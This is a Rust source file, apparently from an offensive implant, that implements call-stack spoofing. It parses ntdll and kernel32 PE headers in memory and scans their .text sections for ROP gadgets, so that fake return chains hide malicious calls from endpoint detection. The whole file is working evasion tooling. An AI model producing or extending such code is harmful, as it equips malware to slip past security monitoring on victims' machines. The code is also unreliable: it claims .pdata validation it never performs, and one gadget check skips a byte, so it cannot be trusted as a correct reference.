/**
 * Dynamic Call Stack Spoofer 
 * Constructs a fake call stack that passes both RBP chain walking AND RtlVirtualUnwind validation by using real return addresses
 * from backed modules (ntdll, kernel32) that have valid RUNTIME_FUNCTION entries in .pdata
 * */

use core::ffi::c_void;
use core::cell::UnsafeCell;
use core::ptr::null_mut;

use crate::core::types::HANDLE;

pub struct SpoofGadgets {
    pub ntdll_gadgets: [*mut c_void; 8 as usize], // Return Sites within ntdll.dll (.pdata-validated)
    pub kernel32_gadgets: [*mut c_void; 8 as usize], // Return Sites within kernel32.dll (.pdata-validated)
    pub count_ntdll: usize, // Number of valid ntdll return sites
    pub count_kernel32: usize, // Number of valid kernel32 sites
    pub initialized: bool,   
}

struct GadgetCell(UnsafeCell<SpoofGadgets>);
unsafe impl Sync for GadgetCell {}

static GADGETS: GadgetCell = GadgetCell(UnsafeCell::new(SpoofGadgets {
    ntdll_gadgets: [null_mut(); 8 as usize],
    kernel32_gadgets: [null_mut(); 8 as usize],
    count_ntdll: 0,
    count_kernel32: 0,
    initialized: false,    
}));


/**
 * A single spoofed stack frame in the fake RBP chain
 * */
#[repr(C)]
pub struct FakeFrame {
    pub rbp: usize,
    pub ret_addr: usize,
}


pub unsafe fn initialize_spoof_gadgets() -> bool {
    let g = &mut *GADGETS.0.get();
    if g.initialized {
        return true;
    }

    let table = crate::core::ssn_table::syscall_table();
    g.count_ntdll = scan_module_for_gadgets(table.modules.ntdll, &mut g.ntdll_gadgets);
    g.count_kernel32 = scan_module_for_gadgets(table.modules.kernel32, &mut g.kernel32_gadgets);

    g.initialized = g.count_ntdll > 0 && g.count_kernel32 > 0;
    g.initialized
}


/**
 * Scab a module .txt section for ROP gadget 
 * */
unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_void; 8 as usize]) -> usize {
    if module_base.is_null() {
        return 0;
    }

    let base = module_base as *const u8;
    let dos = *(base as *const u16);
    if dos != 0x5A4D {
        return 0;
    }

    let e_lfanew = *(base.add(0x3C) as *const i32);
    if e_lfanew < 0 {
        return 0;
    }

    let nt_hdr = base.add(e_lfanew as usize);
    if *(nt_hdr as *const u32) != 0x00004550 {
        return 0;
    }

    let file_hdr = nt_hdr.add(4);
    let number_of_sections = *(file_hdr.add(2) as *const u16) as usize;
    let size_of_optional = *(file_hdr.add(16) as *const u16) as usize;
    let first_section = file_hdr.add(20 + size_of_optional);

    let mut text_rva: usize = 0;
    let mut text_size: usize = 0;

    for i in 0..number_of_sections {
        let section = first_section.add(i * 40);
        let name = first_section.add(i * 40);
        let name = core::slice::from_raw_parts(section, 8);
        if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
            text_rva = *(section.add(12) as *const u32) as usize;
            text_size = *(section.add(8) as *const u32) as usize;
            break;
        }
    }

    if text_rva == 0 || text_size == 0 {
        return 0;
    }

    let text_start = base.add(text_rva);
    let mut count = 0;

    let mut offset: usize = 0x100;
    while offset < text_size.saturating_sub(6) && count < 8 {
        let p = text_start.add(offset);
        // "add rsp, 0x28; ret" - (48 83 C4 28 C3)
        if *p == 0x48 && *p.add(1) == 0x83 && *p.add(2) == 0xC4 && *p.add(4) == 0xC3 { 
            gadgets[count] = p as *mut c_void;
            count += 1;
            offset += 0x1000;
            continue;
        }

        // "pop rbp; ret" - (5D C3)
        if *p == 0x5D && *p.add(1) == 0xC3 && count < 8 {
            gadgets[count] = p as *mut c_void;
            count += 1;
            offset += 0x1000;
            continue;
        }

        // "ret" - (C3)
        if *p == 0xC3 && offset > 0 {
            let prev = *p.sub(1);
            if prev == 0x5D || prev == 0x5F || prev == 0x5E || prev == 0x5B || prev == 0xC8 || (prev >= 0x58 && prev <= 0x5F) {
                gadgets[count] = p as *mut c_void;
                count += 1;
                offset += 0x1000;
                continue;
            }
        }
        offset += 1;
    }

    count
}